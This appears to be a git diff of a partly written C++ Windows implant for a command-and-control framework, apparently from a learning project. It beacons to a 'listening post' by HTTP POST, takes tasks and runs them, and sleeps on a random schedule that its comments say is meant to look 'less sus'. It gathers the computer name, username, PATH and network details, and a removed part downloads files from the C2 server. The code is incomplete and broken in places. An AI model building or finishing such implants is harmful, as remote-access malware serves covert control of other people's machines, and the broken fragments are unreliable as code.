@@ -1,95 +1,40 @@
-#ifdef _WIN32
-#define WIN32_LEAN_AND_MEAN
-#endif
-
-#include "implant.h"
-#include "tasks.h"
-
-#include <string>
-#include <string_view>
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
 #include <iostream>
-#include <chrono>
-#include <algorithm>
-#include<map>
-#include <unistd.h>
-#include <tchar.h>
-#include <stdio.h>
+#include <string>
 
-#include <boost/uuid/uuid_io.hpp>
-#include <boost/property_tree/json_parser.hpp>
-#include <boost/property_tree/ptree.hpp>
-
-#include <cpr/cpr.h>
-
-#include <nlohmann/json.hpp>
-
-using json = nlohmann::json;
-
-//create id fro implant
+//create id from the implant
 UUID implantID;
 UuidCreate( &implantID );
 
-//https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
-//https://pureinfotech.com/list-environment-variables-windows-10/
-TCHAR* envVarStrings[] =
-{
-  TEXT("OS           = %OS%"),
-  TEXT("PATH         = %PATH%"),
-  TEXT("TEMP         = %TEMP%"),
-  TEXT("COMPUTERNAME = %COMPUTERNAME%"),
-  TEXT("USERNAME     = %USERNAME")
-};
-#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
-#define SIZE 32767
-void printError(TCHAR* msg);
 
-TCHAR infoBuff[SIZE];
+// Intialize object vars
+Implant::Implant(std::string host, std::string port, std::string uri) :
+    // server endpoint URL arguments
+    host{ std::move(host) },
+    port{ std::move(port) },
+    uri{ std::move(uri) },
+    // Options for config settings
+    isRunning{ true },
+    dwellDistributionSeconds{ 1. },
 
-//situational awareness
-void Implant::sitAware(){
-    //make a dictionary in c++
-    //https://www.codespeedy.com/dictionary-in-cpp/
-    map<string, string> initVals;
-
-    initVals["implantID"] = implantID;
-    
-    //might be calling these functions wrong!!
-    //https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
-
-    initVals["hostname"] = gethostname(); //--> need to call hostname
-    initVals["username"] = getlogin(); //--> need to call whoami 
-    //https://stackoverflow.com/questions/8953424/how-to-get-the-username-in-c-c-in-linux
-    initVals["token"] = GetCurrentProcessToken();
-
-    //idk how to get this or what this is
-    initVals["networkInterfaces"]; 
-
-    //https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion
-    initVals["os_version"] = GetVersion();
-    initVals["os_name"] = GetComputerName();
-    
-    //dont know if to create a new one or if it already exists
-    initVals["compGUID"];
-
-
-    // connectionIP
-    // sessionKey
-    // initVals["sleepTime"] = dwellDistributionSeconds;
-    // jitter
-    // firstCheckIn
-    // lastCheckIn
-    // os_type
-    // os_version
+    // Thread that runs tasks and performs asynchronus i/o
+    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
 }
 
-// C2 = 
-// REGISTER = 
-// TASK =
-
-//register the implant 
+//enable/disable run status
+void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
 
 
-// Function to send an asynchronous HTTP POST request with a payload to the listening post
+// Sets time for how long implant should wait before contacting server for intructs 
+void Implant::setMeanDwell(double meanDwell) {
+    // Exponential_distribution makes implant blend in with the interwebs 
+    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
+}
+
+// sends asynchronous HTTP POST request with a payload to the listening post
 [[nodiscard]] std::string sendHttpRequest(std::string_view host,
     std::string_view port,
     std::string_view uri,
@@ -102,61 +47,31 @@ void Implant::sitAware(){
     auto const httpVersion = 11;
     auto const requestBody = json::parse(payload);
 
-    // Construct our listening post endpoint URL from user args, only HTTP to start
+    // Construct our server endpoint URL from user args, only HTTP to start
     std::stringstream ss;
     ss << "http://" << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-    // Make an asynchronous HTTP POST request to the server
+    // asynchronous HTTP POST request to the server
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
         cpr::Body{ requestBody.dump() }, //--> what holds the results of any tasks run previously
         cpr::Header{ {"Content-Type", "application/json"} }
     );
-    // Retrieve the response when it's ready
+    // Retrieve the response
     cpr::Response response = asyncRequest.get();
 
-    // Show the request contents
+    // Show the request 
     std::cout << "Request body: " << requestBody << std::endl;
 
-    // Return the body of the response from the listening post, may include new tasks
+    // returns body of response, possibly along with new tasks 
     return response.text;
 };
 
-//Function in progress to download a file from C2 and add it to disk
-{
-    string c2url = "http://localhost:5000"; //Have to make this the URL of th server 
-    string implsntReg = "/implant/register"; //Make this Correct Path 
-    string implantTask = "/implant/task"; //Make this Correct Path
-    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
-
-    return 0;
-}
-
-//URLDOWNLOADTOFILE EXAMPLE CODE
-
-//string dwnld_URL = "127.0.0.1/screenchote.png";
-//string savepath = "D:\\screenchote.png";
-//URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
-//set the situational awareness for the implant
-
-// Implant ID: create an ID for the implant to distinguish it from others
-// Computer Name: what computer did it connect from?
-// Username: what user are you running as?
-// GUID: what is the computer’s GUID?
-// Integrity: what privileges do you have?
-// Connecting IP address: what address did it connect from?
-// Session Key: after you negotiated a session key, store it per agent
-// Sleep: how often does the agent check in?
-// Jitter: how random of a check in is it?
-// First Seen: when did the agent first check in?
-// Last Seen: when was the last time you saw the agent?
-// Expected Check in: When should you expect to see the agent again?
-
-// Method to send task results and receive new tasks
+// sends task results and receives new ones 
 [[nodiscard]] std::string Implant::sendResults() {
     // Local results variable
     boost::property_tree::ptree resultsLocal;
-    // A scoped lock to perform a swap from global results vairbale nto the local results variable 
+    // A scoped lock to perform a swap from global results variable to the local results variable 
     {
         std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
         resultsLocal.swap(results);
@@ -168,21 +83,21 @@ void Implant::sitAware(){
     return sendHttpRequest(host, port, uri, resultsStringStream.str());
 }
 
-// Method to parse tasks received from listening post
+// parses and reveives tasks from server
 void Implant::parseTasks(const std::string& response) {
     // Local response variable to store response
     std::stringstream responseStringStream{ response };
 
-    // Read response from listening post as JSON
+    // reads response from server as json 
     boost::property_tree::ptree tasksPropTree;
     boost::property_tree::read_json(responseStringStream, tasksPropTree);
 
-    // Range based for-loop to parse tasks and push them into the tasks vector
-    // Once this is done, the tasks are ready to be serviced by the implant
+    // for-loop to parse tasks and push them into the tasks vector
+    // Once this is done tasks are ready 
     for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
         // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
         {
-            //basically pushing all the tasks from the JSON file into the tasks vector
+            //pushes tasks from jason into task vector
             tasks.push_back(
                 parseTaskFrom(taskTreeValue, [this](const auto& configuration) { 
                     setMeanDwell(configuration.meanDwell);
@@ -192,17 +107,41 @@ void Implant::parseTasks(const std::string& response) {
     }
 }
 
-// Loop and go through the tasks received from the listening post, then service them
+// starts beaconing to server
+void Implant::beacon() {
+    while (isRunning) {
+        // Try to contact the listening post and send results/get back tasks
+        // Then, if tasks were received, parse and store them for execution
+        // Tasks stored will be serviced by the task thread asynchronously
+        try {
+            std::cout << "implant is sending results to server...\n" << std::endl;
+            const auto serverResponse = sendResults();
+            std::cout << "\nserver response content: " << serverResponse << std::endl;
+            std::cout << "\nParsing tasks received..." << std::endl;
+            parseTasks(serverResponse);
+            std::cout << "\n=================================\n" << std::endl;
+        }
+        catch (const std::exception& e) {
+            printf("\nBeaconing error: %s\n", e.what());
+        }
+        // Sleep and then beacon later
+        const auto sleepTimeDouble = dwellDistributionSeconds(device);
+        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };
+
+        std::this_thread::sleep_for(sleepTimeChrono); //less sus
+}
+
+// go thru and service tasks received from server 
 void Implant::serviceTasks() {
     while (isRunning) {
         // Local tasks variable to store tasks
         std::vector<Task> localTasks;
         // Scoped lock to perform a swap
         {
-            std::scoped_lock<std::mutex> taskLock{ taskMutex }; //do swap from task vector created above 
+            std::scoped_lock<std::mutex> taskLock{ taskMutex }; //swap from task vector 
             tasks.swap(localTasks);
         }
-        // Range based for-loop to call the run() method on each task and add the results of tasks
+        // for-loop to call the run() on each task and add the results of tasks
         for (const auto& task : localTasks) {
             // Call run() on each task and we'll get back values for id, contents and success
             const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
@@ -217,42 +156,50 @@ void Implant::serviceTasks() {
         std::this_thread::sleep_for(std::chrono::seconds{ 1 });
     }
 }
+/*
+### Situational Awareness:
+Whereami, whoami, whatami...
+1. Read the environment variables
+2. List the computer's network interfaces. MAC, IPs, interface names etc... 
+3. Get the windows version
+4. Get the current username and token (?)
+5. Get the Computer Name
+6. Get the Machine GUID (GUID is a 128-bit number used to identify resources)
+7. List files in a directory
+8. Change directory
+9. List all running processes
+*/
 
-// Method to start beaconing to the listening post
-void Implant::beacon() {
-    while (isRunning) {
-        // Try to contact the listening post and send results/get back tasks
-        // Then, if tasks were received, parse and store them for execution
-        // Tasks stored will be serviced by the task thread asynchronously
-        try {
-            std::cout << "RainDoll is sending results to listening post...\n" << std::endl;
-            const auto serverResponse = sendResults();
-            std::cout << "\nListening post response content: " << serverResponse << std::endl;
-            std::cout << "\nParsing tasks received..." << std::endl;
-            parseTasks(serverResponse);
-            std::cout << "\n================================================\n" << std::endl;
-        }
-        catch (const std::exception& e) {
-            printf("\nBeaconing error: %s\n", e.what());
-        }
-        // Sleep for a set duration with jitter and beacon again later
-        const auto sleepTimeDouble = dwellDistributionSeconds(device);
-        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };
-
-        std::this_thread::sleep_for(sleepTimeChrono); //to appear less suspicious
-    }
+char* getEnvirons() {
+    char* environs = new char[32767];
+    DWORD environs_len = 32767;
+    GetEnvironmentVariable("PATH", environs, environs_len);
+    return environs;
 }
 
-// Initialize variables for our object
-Implant::Implant(std::string host, std::string port, std::string uri) :
-    // Listening post endpoint URL arguments
-    host{ std::move(host) },
-    port{ std::move(port) },
-    uri{ std::move(uri) },
-    // Options for configuration settings
-    isRunning{ true },
-    dwellDistributionSeconds{ 1. },
+char* getComputerName() {
+    char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerName(computerName, &computerName_len);
+    return computerName;
+}
 
-    // Thread that runs all our tasks, performs asynchronous I/O
-    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
+char* getNetworkInterfaces() {
+    char* networkInterfaces = new char[32767];
+    DWORD networkInterfaces_len = 32767;
+    GetNetworkParams(networkInterfaces, &networkInterfaces_len);
+    return networkInterfaces;
+}
+
+char* getUserName() {
+    char* username = new char[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserName(username, &username_len);
+    return username;
+}
+
+
+int main() {
+    std::cout << "Hello World!" << std::endl;
+    return 0;
 }
